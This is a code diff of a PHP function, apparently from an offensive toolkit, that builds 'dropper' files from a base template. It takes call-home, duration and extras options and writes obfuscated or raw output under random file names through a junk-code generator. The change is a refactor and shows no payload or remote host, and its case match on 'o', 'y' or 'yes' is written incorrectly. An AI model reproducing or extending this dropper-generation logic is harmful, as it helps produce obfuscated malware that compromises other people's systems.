@@ -206,8 +206,9 @@ function clo($host, $repo, $uri)
 function createDropper($callHome, $duration, $extras, $obfsucate){
     require "includes/droppers/dynamic_generator.php";
     $file_in = 'includes/droppers/base.php';
-    $ob = 'includes/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
-    $n = 'includes/droppers/raw/'.bin2hex(random_bytes(rand(5,25))).'.php';
+    $ob = 'includes/dynamic/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
+    $n = 'includes/dynamic/droppers/raw/'.bin2hex(random_bytes(rand(5,25))).'.php';
+    $t = new dynamic_generator();
     if (!empty($callHome) && !empty($duration) && !empty($extras)){
         try{
             switch(is_file("includes/droppers/base.php")){
@@ -225,23 +226,11 @@ function createDropper($callHome, $duration, $extras, $obfsucate){
             switch (strtolower($obfsucate)){
                 case "o"||"y"||"yes":
                     print("Generated dropper will be: {$ob}\n");
-                    if (!file_exists($ob)){
-                        $fil = fopen($file_in, "r");
-                        while (!feof($fil)){
-
-                        }
-                        fclose($fil);
-                    }
+                    $t->begin_junk($file_in, "1", $ob);
                     break;
                 default:
-                    if (!file_exists($n)){
-                        $fil = fopen($file_in, "r");
-                        while (!feof($fil)){
-
-                        }
-                        fclose($fil);
-                    }
                     print("Generated Dropper will be: {$n}\n");
+                    $t->begin_junk($file_in, "1", $n);
             }
 
         }catch (Exception $exception){
